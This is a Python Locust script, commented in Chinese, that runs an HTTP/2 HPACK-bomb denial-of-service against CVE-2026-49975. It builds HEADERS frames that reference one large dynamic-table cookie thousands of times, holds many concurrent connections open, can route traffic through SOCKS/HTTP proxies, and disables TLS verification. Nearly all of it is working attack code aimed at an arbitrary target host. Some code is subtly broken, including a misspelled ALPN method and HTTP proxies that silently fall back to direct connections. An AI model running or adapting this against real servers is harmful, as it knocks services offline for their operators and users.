#!/usr/bin/env python3
"""
CVE-2026-49975 专用压测脚本
============================
所有并发用户都执行 HTTP/2 HPACK 炸弹攻击，
通过 -u 参数控制并发线程数，测试不同并发下的内存消耗。

代理支持：
  - HTTP 代理:  设置 HTTP_PROXY  环境变量
  - HTTPS 代理: 设置 HTTPS_PROXY 环境变量
  - SOCKS5 代理: 设置 SOCKS5_PROXY 环境变量
  - 或统一设置:  ALL_PROXY 环境变量

示例：
  locust -f locustfile.py --host https://your-target.com \
    --headless -u 100 -r 50 --run-time 5m
  env:
    HTTPS_PROXY: socks5://127.0.0.1:1080
    LOCUST_REFERENCES: "2048"
    LOCUST_HOLD_SECONDS: "15"
"""

from locust import User, task, constant, events
import socket
import ssl
import struct
import time
import logging
import os
import socks  # PySocks 库

logger = logging.getLogger(__name__)

# ============================================================
# 环境变量配置
# ============================================================

REFERENCES = int(os.environ.get("LOCUST_REFERENCES", "2048"))
HOLD_SECONDS = int(os.environ.get("LOCUST_HOLD_SECONDS", "15"))
STREAMS = int(os.environ.get("LOCUST_STREAMS", "1"))

# 代理配置（从环境变量读取）
HTTP_PROXY = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy")
HTTPS_PROXY = os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")
SOCKS5_PROXY = os.environ.get("SOCKS5_PROXY") or os.environ.get("socks5_proxy")
ALL_PROXY = os.environ.get("ALL_PROXY") or os.environ.get("all_proxy")

# 优先级: HTTPS_PROXY > HTTP_PROXY > SOCKS5_PROXY > ALL_PROXY
PROXY_URL = HTTPS_PROXY or HTTP_PROXY or SOCKS5_PROXY or ALL_PROXY or ""


def parse_proxy(proxy_url: str):
    """
    解析代理 URL，返回 (proxy_type, proxy_host, proxy_port)
    
    支持格式：
      socks5://127.0.0.1:1080
      socks5://user:pass@127.0.0.1:1080
      http://127.0.0.1:8080
      http://user:pass@127.0.0.1:8080
      127.0.0.1:1080  (裸地址视为 SOCKS5)
    """
    if not proxy_url:
        return None, None, None

    proxy_url = proxy_url.strip()

    # 裸地址（如 127.0.0.1:1080）默认 SOCKS5
    if "://" not in proxy_url:
        proxy_type = socks.SOCKS5
        host, port = proxy_url.rsplit(":", 1)
        return proxy_type, host.strip(), int(port)

    # 解析 scheme
    if proxy_url.startswith("socks5://"):
        proxy_type = socks.SOCKS5
        rest = proxy_url[8:]
    elif proxy_url.startswith("socks4://"):
        proxy_type = socks.SOCKS4
        rest = proxy_url[9:]
    elif proxy_url.startswith("http://"):
        proxy_type = "http"
        rest = proxy_url[7:]
    elif proxy_url.startswith("https://"):
        proxy_type = "http"  # HTTPS 代理实际走 HTTP CONNECT
        rest = proxy_url[8:]
    else:
        logger.warning(f"未知的代理协议: {proxy_url}，跳过代理")
        return None, None, None

    # 去掉用户认证信息（@ 之后才是 host:port）
    if "@" in rest:
        rest = rest.split("@")[-1]

    # 解析 host:port
    if ":" in rest:
        host, port_str = rest.split(":", 1)
        port = int(port_str.split("/")[0])
    else:
        host = rest.split("/")[0]
        port = 1080 if proxy_type == socks.SOCKS5 else 8080

    return proxy_type, host, port


def create_connection(address, timeout=None, source_address=None, proxy_params=None):
    """
    建立 TCP 连接（支持 SOCKS5 代理）
    
    如果配置了代理，走 SOCKS5 代理
    如果没有配置代理，走普通直连
    """
    proxy_type, proxy_host, proxy_port = proxy_params or (None, None, None)

    if proxy_type == socks.SOCKS5:
        # SOCKS5 代理连接
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        sock.set_proxy(
            proxy_type=socks.SOCKS5,
            addr=proxy_host,
            port=proxy_port,
            username=os.environ.get("SOCKS5_USER"),
            password=os.environ.get("SOCKS5_PASS"),
        )
        if timeout:
            sock.settimeout(timeout)
        sock.connect(address)
        return sock
    elif proxy_type == socks.SOCKS4:
        # SOCKS4 代理连接
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        sock.set_proxy(
            proxy_type=socks.SOCKS4,
            addr=proxy_host,
            port=proxy_port,
            username=os.environ.get("SOCKS4_USER", ""),
        )
        if timeout:
            sock.settimeout(timeout)
        sock.connect(address)
        return sock
    else:
        # 直连
        return socket.create_connection(address, timeout=timeout, source_address=source_address)


# 解析代理参数
PROXY_PARAMS = parse_proxy(PROXY_URL)

# ============================================================
# HTTP/2 帧构建
# ============================================================

CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS_FRAME_TYPE = 0x04
HEADERS_FRAME_TYPE = 0x01


def build_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    length = len(payload)
    return (
        struct.pack(">I", length)[1:]
        + struct.pack("BB", frame_type, flags)
        + struct.pack(">I", stream_id & 0x7FFFFFFF)
        + payload
    )


def build_settings(initial_window_size: int = 0, max_frame_size: int = 16384) -> bytes:
    """SETTINGS 帧：关闭流量控制窗口 (INITIAL_WINDOW_SIZE=0)"""
    payload = struct.pack(">HI", 0x04, initial_window_size) + struct.pack(
        ">HI", 0x05, max_frame_size
    )
    return build_frame(SETTINGS_FRAME_TYPE, 0x00, 0, payload)


def build_headers_frame(stream_id: int, indexed_references: int = 2048) -> bytes:
    """
    HPACK 炸弹 HEADERS 帧：
    1. 向动态表插入 255 字节的 cookie header
    2. 重复引用同一动态表索引（0xBE = 索引 62），放大服务端内存分配
    """
    name = b"cookie"
    value = b"a" * 255
    insert_prefix = bytes([0x40, len(name)]) + name + bytes([len(value)]) + value
    indexed_ref = bytes([0xBE])
    payload = insert_prefix + indexed_ref * indexed_references
    return build_frame(HEADERS_FRAME_TYPE, 0x04 | 0x01, stream_id, payload)


# ============================================================
# 用户类：CVE-2026-49975 HTTP/2 HPACK 炸弹
# ============================================================

class Http2BombUser(User):
    """
    每个用户 = 一个 HTTP/2 HPACK 炸弹攻击线程
    持续建立连接 → 发送炸弹 payload → 保持连接不释放
    """

    wait_time = constant(0)

    references_per_stream = REFERENCES
    streams_per_connection = STREAMS
    hold_seconds = HOLD_SECONDS

    _ssl_ctx = None

    @classmethod
    def _get_ssl_ctx(cls):
        if cls._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.set_alnp_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            cls._ssl_ctx = ctx
        return cls._ssl_ctx

    def _parse_host(self):
        """从 self.host 解析主机名、端口、是否 TLS"""
        host = self.host or "https://127.0.0.1"

        if host.startswith("https://"):
            rest = host[8:]
            default_port = 443
            use_tls = True
        elif host.startswith("http://"):
            rest = host[7:]
            default_port = 80
            use_tls = False
        else:
            rest = host
            default_port = 443
            use_tls = True

        if ":" in rest:
            hostname, port_str = rest.split(":", 1)
            port = int(port_str.split("/")[0])
        else:
            hostname = rest.split("/")[0]
            port = default_port

        return hostname, port, use_tls

    @task
    def http2_bomb_attack(self):
        """
        执行一次 HTTP/2 HPACK 炸弹攻击。
        """
        hostname, port, use_tls = self._parse_host()
        sock = None
        start_time = time.time()
        exception = None

        try:
            # ---- 1. TCP 连接（支持代理）----
            sock = create_connection(
                (hostname, port),
                timeout=10.0,
                proxy_params=PROXY_PARAMS,
            )

            # ---- 2. TLS 握手 ----
            if use_tls:
                sock = self._get_ssl_ctx().wrap_socket(sock, server_hostname=hostname)

            # ---- 3. 发送 HTTP/2 前言 + SETTINGS ----
            sock.sendall(CLIENT_PREFACE)
            sock.sendall(build_settings(initial_window_size=0))

            # ---- 4. 发送 HPACK 炸弹 HEADERS 帧 ----
            for sid in range(1, 2 * self.streams_per_connection, 2):
                frame = build_headers_frame(sid, self.references_per_stream)
                sock.sendall(frame)

            # ---- 5. 保持连接存活 ----
            if self.hold_seconds > 0:
                end_time = time.time() + self.hold_seconds
                while time.time() < end_time:
                    try:
                        sock.settimeout(1.0)
                        data = sock.recv(4096)
                        if not data:
                            break
                    except socket.timeout:
                        continue
                    except OSError:
                        break

        except Exception as e:
            exception = e

        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

            # ===== 手动上报请求统计到 Locust =====
            total_time = int((time.time() - start_time) * 1000)
            request_name = (
                f"/ (refs={self.references_per_stream}, "
                f"hold={self.hold_seconds}s, proxy={bool(PROXY_URL)})"
            )

            # 通过 self.environment.events 访问
            self.environment.events.request.fire(
                request_type="H2-BOMB",
                name=request_name,
                response_time=total_time,
                response_length=0,
                exception=exception,
                context={},
            )


# ============================================================
# 启动时输出配置信息
# ============================================================

@events.init.add_listener
def on_test_start(environment, **kw):
    proxy_display = PROXY_URL if PROXY_URL else "直连（无代理）"
    
    logger.info("=" * 60)
    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
    logger.info(f"  并发用户数 (-u)    : {environment.runner.target_user_count}")
    logger.info(f"  HPACK 引用次数     : {REFERENCES}")
    logger.info(f"  连接保持秒数       : {HOLD_SECONDS}")
    logger.info(f"  每连接流数         : {STREAMS}")
    logger.info(f"  目标地址           : {environment.host}")
    logger.info(f"  代理设置           : {proxy_display}")
    logger.info(f"  测试时长           : {environment.runner.run_time}秒")
    logger.info("=" * 60)
    logger.info("  观察目标服务器内存:")
    logger.info("  $ watch -n 2 'ps aux | grep nginx | grep -v grep'")
    logger.info("=" * 60)